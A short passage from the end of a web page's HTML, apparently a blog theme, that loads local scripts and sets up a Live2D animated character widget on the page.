        };</script><script src="/js/column.js"></script><!--!--><script src="/js/main.js" defer></script><!--!--><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>